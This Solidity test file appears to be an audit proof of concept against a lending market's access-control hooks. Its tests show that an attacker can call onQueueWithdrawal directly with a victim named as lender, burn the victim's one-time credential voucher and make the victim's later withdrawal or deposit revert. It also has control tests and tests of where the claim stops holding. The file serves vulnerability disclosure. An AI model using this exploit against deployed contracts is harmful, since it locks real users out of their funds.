// SPDX-License-Identifier: Apache-2.0
pragma solidity >=0.8.20;

import '../BaseMarketTest.sol';
import 'src/access/IRoleProvider.sol';

/// Illustrative stateful provider: the credential service issues a one-time voucher per account,
/// and `validateCredential` consumes it and stamps the credential with the validation time.
contract OneShotVoucherProvider is IRoleProvider {
  mapping(address => mapping(bytes32 => bool)) public issued;
  mapping(address => mapping(bytes32 => bool)) public consumed;

  function issue(address account, bytes32 voucher) external {
    issued[account][voucher] = true;
  }

  function isPullProvider() external pure override returns (bool) {
    return false;
  }

  function getCredential(address) external pure override returns (uint32) {
    return 0;
  }

  function validateCredential(address account, bytes calldata data) external override returns (uint32) {
    bytes32 voucher = abi.decode(data, (bytes32));
    if (!issued[account][voucher]) return 0;
    issued[account][voucher] = false;
    consumed[account][voucher] = true;
    return uint32(block.timestamp);
  }
}

contract Poc11Test is BaseMarketTest {
  uint32 internal constant TTL = 12; // one block
  uint256 internal constant DELAY = 30; // honest transaction lands after the credential TTL

  OneShotVoucherProvider internal provider;
  address internal carol = address(0xca401);
  address internal attacker = address(0xbad);
  bytes32 internal voucher = keccak256('carol-voucher');

  function setUp() public override {
    super.setUp();
    provider = new OneShotVoucherProvider();
    vm.prank(borrower);
    hooks.addRoleProvider(address(provider), TTL);

    // carol receives market tokens from alice. Transfers do not require access in this market,
    // so carol holds tokens but is not a known lender and has no credential.
    vm.prank(alice);
    market.depositUpTo(10e18);
    vm.prank(alice);
    market.transfer(carol, 1e18);

    assertEq(market.balanceOf(carol) > 0, true, 'carol holds market tokens');
    assertFalse(hooks.isKnownLenderOnMarket(carol, address(market)), 'carol not a known lender');
    assertEq(hooks.getLenderStatus(carol).lastApprovalTimestamp, 0, 'carol has no credential');

    provider.issue(carol, voucher);
  }

  function _hooksData(bytes32 v) internal view returns (bytes memory) {
    return abi.encodePacked(address(provider), v);
  }

  function _marketQueueWithdrawal(address from, uint256 amount, bytes memory hooksData) internal returns (bool ok, bytes memory ret) {
    vm.prank(from);
    (ok, ret) = address(market).call(
      abi.encodePacked(abi.encodeWithSelector(market.queueWithdrawal.selector, amount), hooksData)
    );
  }

  function _directHookCall(address caller, address lender, bytes memory hooksData) internal {
    MarketState memory state = market.currentState();
    vm.prank(caller);
    hooks.onQueueWithdrawal(lender, 0, 0, state, hooksData);
  }

  // Control: with no attacker, the same delayed transaction succeeds.
  function test_control_honestDelayedWithdrawalSucceeds() external {
    vm.warp(block.timestamp + DELAY);
    (bool ok, ) = _marketQueueWithdrawal(carol, 1e18, _hooksData(voucher));
    assertTrue(ok, 'honest queueWithdrawal succeeds when voucher is intact');
    assertTrue(provider.consumed(carol, voucher));
  }

  // Attack: anyone calls the hooks contract directly with carol as `lender`.
  function test_directCall_consumesVoucherAndBlocksDelayedWithdrawal() external {
    // Attacker is an arbitrary EOA with no market tokens and no relationship to carol.
    assertEq(market.balanceOf(attacker), 0);

    _directHookCall(attacker, carol, _hooksData(voucher));

    assertTrue(provider.consumed(carol, voucher), 'provider state changed: voucher consumed');
    assertEq(hooks.getLenderStatus(carol).lastApprovalTimestamp, block.timestamp, 'credential cached for carol');

    // carol's own transaction is included only after the cached credential has expired.
    vm.warp(block.timestamp + DELAY);
    (bool ok, bytes memory ret) = _marketQueueWithdrawal(carol, 1e18, _hooksData(voucher));
    assertFalse(ok, 'carol queueWithdrawal reverts');
    assertEq(bytes4(ret), AccessControlHooks.NotApprovedLender.selector, 'NotApprovedLender');
  }

  // Limit of the claim: a same-block front-run is harmless because the credential it caches is still valid.
  function test_directCall_sameBlockFrontRunIsHarmless() external {
    _directHookCall(attacker, carol, _hooksData(voucher));
    (bool ok, ) = _marketQueueWithdrawal(carol, 1e18, _hooksData(voucher));
    assertTrue(ok, 'carol succeeds when included in the same block');
  }

  // Through the market's queueWithdrawal the attacker can only validate their own account.
  function test_viaMarketQueueWithdrawal_cannotTargetOtherAccount() external {
    vm.prank(alice);
    market.transfer(attacker, 1e18);
    (bool ok, bytes memory ret) = _marketQueueWithdrawal(attacker, 1e18, _hooksData(voucher));
    assertFalse(ok);
    assertEq(bytes4(ret), AccessControlHooks.NotApprovedLender.selector);
    assertFalse(provider.consumed(carol, voucher), 'carol voucher untouched');
    assertTrue(provider.issued(carol, voucher), 'carol voucher still valid');
  }

  // onTransfer validates the *recipient* with caller-supplied data, so an attacker holding dust of
  // market tokens can also make the provider consume carol's voucher through a hooked market. The
  // market path differs: a valid credential marks the recipient a known lender (canSetKnownLender),
  // which permanently satisfies onQueueWithdrawal, so the delayed withdrawal is not blocked.
  function test_viaMarketTransfer_consumesVoucherButMakesRecipientKnownLender() external {
    vm.prank(alice);
    market.transfer(attacker, 1000);

    vm.prank(attacker);
    (bool ok, ) = address(market).call(
      abi.encodePacked(abi.encodeWithSelector(market.transfer.selector, carol, 1), _hooksData(voucher))
    );
    assertTrue(ok, 'transfer with extra data succeeds');
    assertTrue(provider.consumed(carol, voucher), 'voucher consumed through the market path');
    assertTrue(hooks.isKnownLenderOnMarket(carol, address(market)), 'carol marked known lender');

    vm.warp(block.timestamp + DELAY);
    (bool ok2, ) = _marketQueueWithdrawal(carol, 1e18, '');
    assertTrue(ok2, 'carol withdraws without any credential: no harm via this path');
  }

  // Where the missing check is the enabler: a known lender is shielded on the market paths
  // (onTransfer and onQueueWithdrawal both skip validation for known lenders), but the direct call
  // evaluates `isKnownLenderOnMarket[lender][msg.sender]` with msg.sender = attacker, so the shield is bypassed.
  function test_knownLender_onlyReachableByDirectCall() external {
    address dave = address(0xda4e);
    bytes32 v1 = keccak256('dave-v1');
    bytes32 v2 = keccak256('dave-v2');
    asset.mint(dave, 10e18);
    vm.prank(dave);
    asset.approve(address(market), type(uint256).max);

    // dave's first deposit presents voucher v1 and becomes a known lender on this market.
    provider.issue(dave, v1);
    vm.prank(dave);
    (bool ok, ) = address(market).call(
      abi.encodePacked(abi.encodeWithSelector(market.depositUpTo.selector, 1e18), _hooksData(v1))
    );
    assertTrue(ok, 'first deposit with voucher succeeds');
    assertTrue(hooks.isKnownLenderOnMarket(dave, address(market)), 'dave is now a known lender');

    // Later dave is issued a fresh voucher for a second deposit (deposits always re-check access here).
    vm.warp(block.timestamp + DELAY);
    provider.issue(dave, v2);

    // Market path: an attacker transfer to dave skips validation, voucher untouched.
    vm.prank(alice);
    market.transfer(attacker, 1000);
    vm.prank(attacker);
    (bool okT, ) = address(market).call(
      abi.encodePacked(abi.encodeWithSelector(market.transfer.selector, dave, 1), _hooksData(v2))
    );
    assertTrue(okT);
    assertFalse(provider.consumed(dave, v2), 'market path cannot touch a known lender voucher');

    // Direct path: consumes it.
    _directHookCall(attacker, dave, _hooksData(v2));
    assertTrue(provider.consumed(dave, v2), 'direct call consumes known lender voucher');

    // dave's delayed deposit now fails.
    vm.warp(block.timestamp + DELAY);
    vm.prank(dave);
    (bool ok2, bytes memory ret) = address(market).call(
      abi.encodePacked(abi.encodeWithSelector(market.depositUpTo.selector, 1e18), _hooksData(v2))
    );
    assertFalse(ok2, 'dave deposit reverts');
    assertEq(bytes4(ret), AccessControlHooks.NotApprovedLender.selector);
  }
}
